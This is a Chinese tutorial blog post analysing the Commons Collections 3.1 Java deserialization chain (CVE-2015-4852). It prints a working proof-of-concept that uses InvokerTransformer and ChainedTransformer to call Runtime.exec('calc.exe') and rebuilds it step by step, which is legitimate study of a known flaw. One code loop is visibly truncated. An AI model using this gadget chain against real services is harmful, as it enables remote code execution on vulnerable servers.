推荐阅读时间：60min  
全文字数：2w+
## 前言
这是个人学习java反序列化的第一篇利用链的文章，就好像P牛说的`不知道为什么网上讲到java反序列化学习，上来就是cc链，你知道这个链它有多复杂么.jpg`。萌新也是理所当然的踩了这个坑，然后.....在一路质疑自己智商和"我不服"的情况下趟了过去。
路难行，难行，总归要走。  
走来，回望去，呵，牛逼。
在此文中是以一个只了解java反射机制和反序列化利用点（readObject）的视角去一点点复现推导了commons-collections、jdk1.7的poc的构造。
同时记录下了一个个踩的坑，再爬出来，再跳进去，再爬出来的历程。
如果你具备了反射机制和反序列化基本原理的知识，同时想学习cc链的话，个人感觉是这篇文是再适合不过了。
那么开始。
了解反射机制的话，我们会发现若存在一个固有的反射机制时，输入可控，就可能形成任意函数调用的情况，具有极大的危害。  
但实际上真的有存在这种情况：这就是commons-collections-3.1 jar包，cve编号：cve-2015-4852
在开始之前我们需要理一下反序列化漏洞的攻击流程：
  1. 客户端构造payload(有效载荷)，并进行一层层的封装，完成最后的exp（exploit-利用代码）
  2. exp发送到服务端，进入一个服务端自主复写（也可能是也有组件复写）的readobject函数，它会反序列化恢复我们构造的exp去形成一个恶意的数据格式exp_1（剥去第一层）
  3. 这个恶意数据exp_1在接下来的处理流程(可能是在自主复写的readobject中、也可能是在外面的逻辑中)，会执行一个exp_1这个恶意数据类的一个方法，在方法中会根据exp_1的内容进行函处理，从而一层层地剥去（或者说变形、解析）我们exp_1变成exp_2、exp_3......
  4. 最后在一个可执行任意命令的函数中执行最后的payload，完成远程代码执行。
那么以上大概可以分成三个主要部分：
  1. payload：需要让服务端执行的语句：比如说弹计算器还是执行远程访问等；我把它称为：payload
  2. 反序列化利用链：服务端中存在的反序列化利用链，会一层层拨开我们的exp，最后执行payload。(在此篇中就是commons-collections利用链)
  3. readObject复写利用点：服务端中存在的可以与我们漏洞链相接的并且可以从外部访问的readObject函数复写点；我把它称为readObject复写利用点（自创名称...）
## commons-collections-3.1
首先来看看[commons-collections项目](http://commons.apache.org/proper/commons-collections/index.html)吧  
官网第一段：
> Java commons-collections是JDK
> 1.2中的一个主要新增部分。它添加了许多强大的数据结构，可以加速大多数重要Java应用程序的开发。从那时起，它已经成为Java中公认的集合处理标准。
Apache Commons
Collections是一个扩展了Java标准库里的Collection结构的第三方基础库，它提供了很多强有力的数据结构类型并且实现了各种集合工具类。作为Apache开源项目的重要组件，Commons
Collections被广泛应用于各种Java应用的开发。  
它是一个基础数据结构包，同时封装了很多功能，其中我们需要关注一个功能：
>   * Transforming decorators that alter each object as it is added to the
> collection
>   * 转化装饰器：修改每一个添加到collection中的object
>
Commons
Collections实现了一个TransformedMap类，该类是对Java标准数据结构Map接口的一个扩展。该类可以在一个元素被加入到集合内时，自动对该元素进行特定的修饰变换，具体的变换逻辑由Transformer类定义，Transformer在TransformedMap实例化时作为参数传入。  
`org.apache.commons.collections.Transformer`这个类可以满足固定的类型转化需求，其转化函数可以自定义实现，我们的漏洞触发函数就是在于这个点。
漏洞复现需要下载3.1版本源码[3.1版本的下载地址](https://archive.apache.org/dist/commons/collections/),进去寻觅一下源码和jar包都有。
由于没有找到漏洞版本3.1的api说明，我们可以参考[3.2.2的api文档](http://commons.apache.org/proper/commons-collections/javadocs/api-3.2.2/index.html)
## POC->利用链
我们将通过调试POC得到漏洞利用链的调用栈，顺便介绍一下各个类，再通过分析调用栈的函数，反推出POC来探究其中的利用原理。
我们先看一下网上的POC代码，如下：
    import org.apache.commons.collections.*;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import org.apache.commons.collections.map.TransformedMap;
    import java.util.HashMap;
    import java.util.Map;
    public class commons_collections_3_1 {
        public static void main(String[] args) throws Exception {
            //此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码
            Transformer[] transformers = new Transformer[] {
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),
                    new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),
                    new InvokerTransformer("exec", new Class[] {String.class }, new Object[] {"calc.exe"})
            };
            //将transformers数组存入ChaniedTransformer这个继承类
            Transformer transformerChain = new ChainedTransformer(transformers);
            //创建Map并绑定transformerChina
            Map innerMap = new HashMap();
            innerMap.put("value", "value");
            //给予map数据转化链
            Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
            //触发漏洞
            Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next();
            //outerMap后一串东西，其实就是获取这个map的第一个键值对（value,value）；然后转化成Map.Entry形式，这是map的键值对数据格式
            onlyElement.setValue("foobar");
        }
    }
> 好好看代码的同学肯定会意识到，以上的poc其实只包括我总结三要素的payload和反序列化利用链两者。  
>  而关键的readObject复写利用点没有包含在内。事实确实如此。  
>
> 这个poc的复写利用点是`sun.reflect.annotation.AnnotationInvocationHandler的readObject()`，但是我们先精简代码关注payload和利用链，最后再加上readObject复写点。
调试以上POC，得到两种调用栈：  
### 漏洞链
[Map.Entry](https://blog.csdn.net/gm371200587/article/details/82108372)其实就是键值对的数据格式，其setValue函数如下  
`AbstracInputCheckedMapDecorator.class`
    public Object setValue(Object value) {
                value = this.parent.checkSetValue(value);//进入此处
                return super.entry.setValue(value);
            }
[TransformedMap](http://commons.apache.org/proper/commons-collections/javadocs/api-3.2.2/org/apache/commons/collections/map/TransformedMap.html)是一种重写map类型的set函数和Map.Entry类型的setValue函数去调用转换链的Map类型。  
`TransformedMap.class`
    protected Object checkSetValue(Object value) {
            return this.valueTransformer.transform(value);//进入此处
        }
由于TransformedMap具有commons_collections的转变特性，当赋值一个键值对的时候会自动对输入值进行预设的Transformer的调用。
[`ChainedTransformer.class`](http://commons.apache.org/proper/commons-collections/javadocs/api-3.2.2/org/apache/commons/collections/functors/ChainedTransformer.html)：这里有一个
    public Object transform(Object object) {
            for(int i = 0; i  AbstracInputCheckedMapDecorator.setValue()
    => TransformedMap.checkSetValue()
    => ChainedTransformer.transform(Object object)
        根据数组，先进入 => ConstantTransformer.transform(Object input)
        再进入 => InvokerTransformer.transform(Object input)
## 重构POC
首先明确我们的最终目的是为了执行语句`Runtime.getRuntime().exec("calc.exe");`
  * Runtime.getRuntime：获取一个Runtime的实例
  * exec()：调用实例的exec函数
因为漏洞函数最后是通过反射机制调用任意这个语句先转化成反射机制如下（后面需要用到）：
> 至于如何构造反射机制的语句，参考往期文章java反射机制
    Class.forName("java.lang.Runtime")
    .getMethod("exec", String.class)
    .invoke(
    Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime"))//此处在获取实例
    ,
    "calc.exe"
    )
### 第一步 InvokerTransformer
再回看反射机制触发函数`InvokerTransformer`类的`transform(Object input)`（做了简化处理，只留取重点部分）：
    public Object transform(Object input) {
        Class cls = input.getClass();
        Method method = cls.getMethod(this.iMethodName, this.iParamTypes);
        return method.invoke(input, this.iArgs);
通过构造的反射机制以及以上代码进行填空，可以得出当变量等于以下值时，可形成命令执行：
    Object input=Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime"));
    this.iMethodName="exec"
    this.iParamTypes=String.class
    this.iArgs="calc.exe"
那么在`InvokerTransformer`类源码中我们可以找到赋值this.iMethodName,this.iParamTypes,this.iArgs的构造函数:
    public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
            this.iMethodName = methodName;
            this.iParamTypes = paramTypes;
            this.iArgs = args;
        }
我们就可以构建以下测试代码直接调用InvokerTransformer通过反射执行任意命令：  
下面开始试一下：
    public static void main(String[] args) throws Exception {
        //通过构造函数，输入对应格式的参数，对iMethodName、iParamTypes、iArgs进行赋值
        InvokerTransformer a = new InvokerTransformer(
                "exec",
                new Class[]{String.class},
                new String[]{"calc.exe"}
        );
        //构造input
        Object input=Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime"));
        //执行
        a.transform(input);
    }